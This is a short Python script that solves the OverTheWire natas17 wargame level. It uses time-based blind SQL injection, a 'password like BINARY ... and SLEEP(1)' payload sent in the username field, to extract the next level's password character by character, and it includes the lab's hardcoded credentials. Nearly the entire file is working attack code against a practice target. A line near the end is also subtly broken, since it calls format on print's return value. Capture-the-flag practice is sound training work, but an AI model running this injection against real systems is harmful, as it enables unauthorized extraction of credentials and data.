#!/bin/python
import requests, string

base_url = "http://natas17.natas.labs.overthewire.org/index.php"
auth_username = "natas17"
auth_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

all_chars = 'dghjlmpqsvwxyCDFIKOPR047'

password_dictionary = []
i = 0
while len(password_dictionary) < len(auth_password):
  char = all_chars[i]
  querystr = ''.join(['natas18" and password like BINARY "',''.join(password_dictionary),char,'%" and SLEEP(1) #'])
  payload = { 'username': querystr }
  print("Testing -> " +  char)
  r = requests.post(base_url, auth=(auth_username, auth_password), data=payload)  
  if r.elapsed.seconds >= 1:
    password_dictionary.append(char)
    print("Password for natas18: {0}").format(''.join(password_dictionary))
  i = i + 1
  if i >= len(all_chars):
    i = 0
print("Password complete.")

